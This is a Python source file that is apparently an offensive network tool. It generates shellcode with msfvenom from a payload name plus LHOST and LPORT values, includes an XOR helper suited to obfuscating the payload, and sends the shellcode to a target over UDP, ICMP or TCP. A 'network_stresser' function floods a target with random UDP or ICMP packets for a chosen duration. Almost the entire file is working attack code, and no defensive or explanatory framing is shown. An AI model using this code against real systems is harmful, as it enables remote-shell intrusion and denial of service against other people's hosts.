import os
import socket
import time
import subprocess
from scapy.all import IP, UDP, ICMP, Raw, send

def xor_encrypt(data, key):
    return bytearray([b ^ key for b in data])

def generate_shellcode(payload, lhost, lport):
    # Use msfvenom to generate the shellcode
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
    result = subprocess.run(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")
    return result.stdout

def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(num_packets):
        try:
            sock.sendto(shellcode, (target_ip, target_port))
            print(f"Packet {i+1}/{num_packets} sent to {target_ip}:{target_port}")
            time.sleep(burst_interval)
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    sock.close()

def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
    for i in range(num_packets):
        pkt = IP(dst=target_ip)/ICMP()/Raw(load=shellcode)
        try:
            send(pkt, verbose=False)
            print(f"ICMP Packet {i+1}/{num_packets} sent to {target_ip}")
            time.sleep(burst_interval)
        except Exception as e:
            print(f"An error occurred: {e}")
            break

def send_shellcode_via_tcp(shellcode, target_ip, target_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(shellcode)
        print(f"Shellcode sent to {target_ip}:{target_port} via TCP")

def network_stresser(target_ip, target_port, duration, protocol):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(1024)  # Random payload of 1024 bytes
    while time.time() < end_time:
        if protocol == 'udp':
            sock.sendto(packet, (target_ip, target_port))
        elif protocol == 'icmp':
            pkt = IP(dst=target_ip)/ICMP()/Raw(load=packet)
            send(pkt, verbose=False)
        print(f"Stressing {protocol.upper()} to {target_ip}:{target_port}")
    sock.close()